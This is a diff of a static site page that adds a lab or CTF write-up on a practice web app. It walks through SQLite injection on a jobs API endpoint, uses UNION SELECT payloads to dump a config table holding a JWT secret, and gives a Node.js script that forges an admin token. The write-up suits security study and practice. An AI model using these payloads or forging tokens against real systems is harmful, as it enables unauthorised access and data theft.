@@ -16,7 +16,7 @@
         <link rel="prev" href="../sokudo/">
       
       
-        <link rel="next" href="../../../ttricks/privesc/linux/">
+        <link rel="next" href="../shady/">
       
       
       <link rel="icon" href="../../../images/telefono.ico">
@@ -76,6 +76,11 @@
     <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
     <label class="md-overlay" for="__drawer"></label>
     <div data-md-component="skip">
+      
+        
+        <a href="#0x00-recon" class="md-skip">
+          Skip to content
+        </a>
       
     </div>
     <div data-md-component="announce">
@@ -2885,7 +2890,7 @@
             
   
   <span class="md-ellipsis">
-    bug scope
+    bug forge
     
   </span>
   
@@ -2896,7 +2901,7 @@
         <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_6_4_label" aria-expanded="true">
           <label class="md-nav__title" for="__nav_6_4">
             <span class="md-nav__icon md-icon"></span>
-            bug scope
+            bug forge
           </label>
           <ul class="md-nav__list" data-md-scrollfix>
             
@@ -2958,6 +2963,18 @@
       
       
       
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  <span class="md-ellipsis">
+    writeup furhire
+    
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
       <a href="./" class="md-nav__link md-nav__link--active">
         
   
@@ -2969,6 +2986,72 @@
 
       </a>
       
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#0x00-recon" class="md-nav__link">
+    <span class="md-ellipsis">
+      0x00: recon
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#0x02-fuzzing" class="md-nav__link">
+    <span class="md-ellipsis">
+      0x02: fuzzing
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#0x03-show-me-the-flag" class="md-nav__link">
+    <span class="md-ellipsis">
+      0x03: show me the flag
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../shady/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    writeup shady oaks financial
+    
+  </span>
+  
+
+      </a>
     </li>
   
 
@@ -3477,6 +3560,41 @@
   
   
   
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#0x00-recon" class="md-nav__link">
+    <span class="md-ellipsis">
+      0x00: recon
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#0x02-fuzzing" class="md-nav__link">
+    <span class="md-ellipsis">
+      0x02: fuzzing
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#0x03-show-me-the-flag" class="md-nav__link">
+    <span class="md-ellipsis">
+      0x03: show me the flag
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
 </nav>
                   </div>
                 </div>
@@ -3502,9 +3620,72 @@
         <li>🟡 <b>difficulty:</b> <span style="color: #dfb52b;">medium</span></li>
         <li>⚡ <b>xp earned:</b> <span style="color: #d29922;">50</span></li>
         <li>📂 <b>categories:</b> <code>api</code>
-        <li>🛠️ <b>vulns:</b> <code>improper inventory management, no jwt validation</code>
+        <li>🛠️ <b>vulns:</b> <code>sqlite injection</code>
     </ul>
 </div>
+
+<h2 id="0x00-recon">0x00: recon</h2>
+<ul>
+<li>
+<p>opening the webapp, we see two options: login as a job seeker and login as a recruiter</p>
+<p><img alt="login" src="../image-15.png" /></p>
+</li>
+<li>
+<p>creating our job seeker user, we can improve our profile and access the dashboard</p>
+<p><img alt="dash" src="../image-16.png" /></p>
+</li>
+<li>
+<p>when we look for jobs, there's made some requests to <code>/api/jobs/&lt;id&gt;</code> and <code>/api/jobs?search=</code> endpoints.</p>
+<p><img alt="alt text" src="../image-17.png" /></p>
+</li>
+</ul>
+<h2 id="0x02-fuzzing">0x02: fuzzing</h2>
+<ul>
+<li>
+<p>testing for sql injection on both endpoints, we discover that <code>/api/jobs/&lt;id&gt;</code> endpoint is vulnerable with the payload: <code>1 or 1=1--</code> (probably sqlite database)</p>
+<p><img alt="sqli" src="../image-19.png" /></p>
+</li>
+<li>
+<p>we can start with <code>order by</code> queries and try to find out how many columns exists on that table. after try for a while, we discover there exists 16 columns. payload: <code>1 order by 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16--</code></p>
+<p><img alt="columns" src="../image-20.png" /></p>
+</li>
+<li>
+<p>now, with a <code>union select</code> query, we can extract informations from that table and from another tables. before this, lets confirm that we are really in a sqlite database. payload: <code>1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,sqlite_version(),16--</code></p>
+<p><img alt="version" src="../image-21.png" /></p>
+</li>
+<li>
+<p>discovering all tables. payload: <code>1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,group_concat(tbl_name) FROM sqlite_master WHERE type='table'--</code></p>
+<p><img alt="tables" src="../image-22.png" /></p>
+</li>
+<li>
+<p>discovering columns of <code>config</code> table. payload: <code>1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,MAX(sql) FROM sqlite_master WHERE tbl_name='config'--</code></p>
+<p><img alt="config" src="../image-23.png" /></p>
+</li>
+<li>
+<p>from the <code>key</code> column, we discover the jwt secret. now, we can write a script to generate an admin jwt and finally take the flag. payload: <code>1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,key||':'||value FROM config--</code></p>
+<p><img alt="key" src="../image-24.png" /></p>
+</li>
+</ul>
+<h2 id="0x03-show-me-the-flag">0x03: show me the flag</h2>
+<ul>
+<li>
+<p>our script can be something like this:</p>
+<p><div class="highlight"><pre><span></span><code><span class="kd">const</span><span class="w"> </span><span class="nx">jwt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;jsonwebtoken&#39;</span><span class="p">)</span>
+<span class="kd">const</span><span class="w"> </span><span class="nx">secret</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;phonesCheeseTiramisu1199&#39;</span>
+
+<span class="kd">let</span><span class="w"> </span><span class="nx">payload</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="s2">&quot;id&quot;</span><span class="o">:</span><span class="w"> </span><span class="mf">6</span><span class="p">,</span>
+<span class="w">    </span><span class="s2">&quot;username&quot;</span><span class="o">:</span><span class="w"> </span><span class="s2">&quot;ghu&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="s2">&quot;role&quot;</span><span class="o">:</span><span class="w"> </span><span class="s2">&quot;admin&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="s2">&quot;iat&quot;</span><span class="o">:</span><span class="w"> </span><span class="mf">1768580027</span>
+<span class="p">}</span>
+
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">jwt</span><span class="p">.</span><span class="nx">sign</span><span class="p">(</span><span class="nx">payload</span><span class="p">,</span><span class="w"> </span><span class="nx">secret</span><span class="p">))</span>
+</code></pre></div>
+- writing the jwt at the local storage, we take the flag:</p>
+<p><img alt="flag" src="../image-25.png" /></p>
+</li>
+</ul>
 
 
 
